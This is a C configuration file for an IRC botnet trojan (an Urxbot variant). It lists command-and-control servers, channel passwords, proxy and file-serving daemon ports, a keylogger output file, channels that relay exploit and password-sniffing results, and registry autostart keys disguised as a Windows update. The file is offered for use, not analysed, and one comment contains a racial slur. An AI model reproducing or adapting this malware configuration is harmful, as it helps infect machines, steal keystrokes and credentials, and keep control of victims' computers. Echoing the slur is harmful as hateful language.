// bot configuration (generic) - doesn't need to be encrypted
int port = 6668;				// server port
int port2 = 6667;				// backup server port
int socks4port = 1337;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 8082;				// Port # for tftp daemon to run on
int httpport = 8083;			// Port # for http daemon to run on
int rloginport = 8084;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 8;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = TRUE;			// nick uptime & mirc prefix gj niggerface.. k

#ifdef DEBUG_LOGGING
char logfile[]="";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!



#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "GP001";						// bot id
char version[] = "Urxbot.sKull-Reptile.Mix GP Edition";		// Bots !version reply
char password[] = "thisisanewbotheh_911";					// bot password
char server[] = "pwned.upolzworld.net";		// server
char serverpass[] = "";						// server password
char channel[] = "##pwned";				// channel that the bot should join
char chanpass[] = "gp0099";						// channel password
char server2[] = "elite-st0rm.no-ip.org";						// backup server (optional)
char channel2[] = "##pwned2";						// backup channel (optional)
char chanpass2[] = "gp00992";						// backup channel password (optional)
char filename[] = "wrep.exe";			// destination file name
char keylogfile[] = "wrep.xml";				// keylog filename
char valuename[] = "Microsoft Windows update 2005";		// value name for autostart
char nickconst[] = "fvck3d-";					// first part to the bot's nick
char szLocalPayloadFile[]="repgp32.dat";	// Payload filename
char modeonconn[] = "+i";					// Can be more than one mode and contain both + and -
char exploitchan[] = "##pwned";					// Channel where exploit messages get redirected
char keylogchan[] = "##pwned";						// Channel where keylog messages get redirected
char psniffchan[] = "#psniff";						// Channel where psniff messages get redirected 

char *authost[] = {
	"REPTILE@GP"
};

char *versionlist[] = {
	"mIRC v6.16 Khaled Mardam-Bey",
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";



#endif

#ifdef PLAIN_CRYPT
char key[16] = "4ibjklO25u4kj9g1"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif
